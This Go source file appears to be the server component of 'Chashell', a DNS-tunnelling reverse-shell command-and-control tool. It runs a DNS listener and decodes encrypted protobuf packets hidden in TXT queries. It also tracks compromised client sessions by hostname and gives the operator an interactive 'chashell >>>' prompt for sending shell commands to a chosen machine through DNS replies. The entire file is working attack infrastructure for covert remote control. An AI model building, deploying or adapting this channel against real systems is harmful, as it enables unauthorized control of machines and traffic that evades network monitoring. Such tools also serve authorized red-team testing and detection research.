package main

import (
	"bufio"
	"bytes"
	"chacomm/crypto"
	"chacomm/protocol"
	"chacomm/transport"
	"encoding/hex"
	"fmt"
	"github.com/c-bata/go-prompt"
	"github.com/golang/protobuf/proto"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"github.com/miekg/dns"
	"sync"
	"time"
)


var currentSession string
var packetBuffer bytes.Buffer
var conn net.Conn

var (
	targetDomain string
	encryptionKey string
)


var packetQueue = map[string][]string{}

var sessionsMap = map[string]*clientInfo{}

type clientInfo struct {
	hostname string
	heartbeat int64
	mutex sync.Mutex
	conn map[int32]connData
}

type connData struct {
	chunkSize int32
	nonce []byte
	packets map[int32]string
}


func (ci *clientInfo) getChunk(chunkId int32)(connData) {
	return ci.conn[chunkId]

}


func parseQuery(m *dns.Msg) {
	for _, q := range m.Question {
		switch q.Qtype {
		case dns.TypeTXT:
			dataPacket := strings.Replace(strings.Replace(q.Name, targetDomain, "", -1), ".", "", -1)

			dataPacketRaw, err := hex.DecodeString(dataPacket)

			if err != nil {
				log.Printf("Unable to decode data packet : %s", dataPacket)
			}

			message := &chacomm.Message{}
			if err := proto.Unmarshal(dataPacketRaw, message); err != nil {
				log.Fatalln("Failed to parse message packet:", err)
			}

			answer := "-"

			clientGuid := hex.EncodeToString(message.Clientguid)
			now := time.Now()

			if clientGuid == "" {
				break
			}


			session, valid := sessionsMap[clientGuid]

			if !valid {
				log.Printf("New session : %s\n", clientGuid)
				sessionsMap[clientGuid] = &clientInfo{heartbeat: now.Unix(), conn: make(map[int32]connData)}

				session = sessionsMap[clientGuid]
			}

			session.mutex.Lock()

			switch u := message.Packet.(type) {
			case *chacomm.Message_Pollquery:
				output, valid := crypto.Open(u.Pollquery.Identifier, u.Pollquery.Nonce, encryptionKey)
				if valid {
					session.hostname = string(output)
					session.heartbeat = now.Unix()

					queue, valid := packetQueue[clientGuid]

					if valid && len(queue) > 0 {
						answer = queue[0]
						packetQueue[clientGuid] = queue[1:]
					}
				}


			case *chacomm.Message_Chunkstart:
				session.conn[u.Chunkstart.Chunkid] = connData{chunkSize: u.Chunkstart.Chunksize, nonce: u.Chunkstart.Nonce, packets: make(map[int32]string)}

			case *chacomm.Message_Chunkdata:

				connection := session.getChunk(u.Chunkdata.Chunkid)

				connection.packets[u.Chunkdata.Chunknum] = string(u.Chunkdata.Packet)


				if len(connection.packets) == int(connection.chunkSize) {
					var chunkBuffer bytes.Buffer
					for i := 0; i <= int(connection.chunkSize)-1; i++ {
						chunkBuffer.WriteString(connection.packets[int32(i)])
					}

					output, valid := crypto.Open(chunkBuffer.Bytes(), connection.nonce, encryptionKey)


					if valid {
						if currentSession == clientGuid {
							fmt.Printf("%s", output)
						}
					} else {
						log.Fatal("Invalid data !\n")
					}
				}



			default:
				log.Printf("Unknown message type received : %v\n", u)
			}
			session.mutex.Unlock()
			rr, _ := dns.NewRR(fmt.Sprintf("%s TXT %s", q.Name, answer))
			m.Answer = append(m.Answer, rr)

		}

	}
}

func handleDnsRequest(w dns.ResponseWriter, r *dns.Msg) {

	m := new(dns.Msg)
	m.SetReply(r)
	m.Compress = false

	switch r.Opcode {
	case dns.OpcodeQuery:
		parseQuery(m)
	}

	w.WriteMsg(m)
}

func ShellServer(sessionId string){
	currentSession = sessionId
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		if scanner.Text() == "background" {
			return
		}
		initPacket, dataPackets := transport.Encode([]byte(scanner.Text() + "\n"), false, encryptionKey, targetDomain, nil)
		_, valid := packetQueue[sessionId]
		if !valid {
			packetQueue[sessionId] = make([]string, 0)
		}
		packetQueue[sessionId] = append(packetQueue[sessionId], initPacket)
		for _, packet := range dataPackets {
			packetQueue[sessionId] = append(packetQueue[sessionId], packet)
		}

	}
	if err := scanner.Err(); err != nil {
		fmt.Fprintln(os.Stderr, "reading standard input:", err)
	}
}


var commands = []prompt.Suggest{
	{Text: "sessions", Description: "Interact with the specified machine."},
	{Text: "exit", Description: "Stop the Chashell Server"},
}

func Completer(d prompt.Document) []prompt.Suggest {
	if d.TextBeforeCursor() == "" {
		return []prompt.Suggest{}
	}
	args := strings.Split(d.TextBeforeCursor(), " ")

	return argumentsCompleter(args)
}

func argumentsCompleter(args []string) []prompt.Suggest {
	if len(args) <= 1 {
		return prompt.FilterHasPrefix(commands, args[0], true)
	}

	first := args[0]
	switch first {
	case "sessions":
		second := args[1]
		if len(args) == 2 {
			sessions := []prompt.Suggest{}
			for clientGuid, clientInfo:= range sessionsMap {
				sessions = append(sessions, prompt.Suggest{Text: clientGuid, Description: clientInfo.hostname})
			}

			return prompt.FilterHasPrefix(sessions, second, true)
		}

	}
	return []prompt.Suggest{}
}

func executor(in string) {
	args := strings.Split(in, " ")
	if len(args) > 0 {
		switch args[0]{
		case "exit":
			fmt.Println("Exiting.")
			os.Exit(0)
		case "sessions":
			if len(args) == 2 {
				fmt.Printf("Interacting with session %s.\n", args[1])
				ShellServer(args[1])
			} else {
				fmt.Println("sessions [id]")
			}
		}
	}
}

func main() {

	go func() {
		// attach request handler func
		dns.HandleFunc(targetDomain, handleDnsRequest)

		// start server
		port := 53
		server := &dns.Server{Addr: ":" + strconv.Itoa(port), Net: "udp"}

		log.Printf("Starting DNS Listener %d\n", port)
		err := server.ListenAndServe()
		defer server.Shutdown()
		if err != nil {
			log.Fatalf("Failed to start server: %s\n ", err.Error())
		}
	}()

	go func(){
		for {
			time.Sleep(1 * time.Second)
			now := time.Now()
			for clientGuid, session := range sessionsMap {
				if session.heartbeat + 30 < now.Unix() {
					log.Printf("Client timed out [%s].\n", clientGuid)
					// Delete from sessions list.
					delete(sessionsMap, clientGuid)
					// Delete all queued packets.
					delete(packetQueue, clientGuid)
				}
			}
		}
	}()

	p := prompt.New(executor, Completer, prompt.OptionPrefix("chashell >>> "))
	p.Run()


	//ShellServer()

}
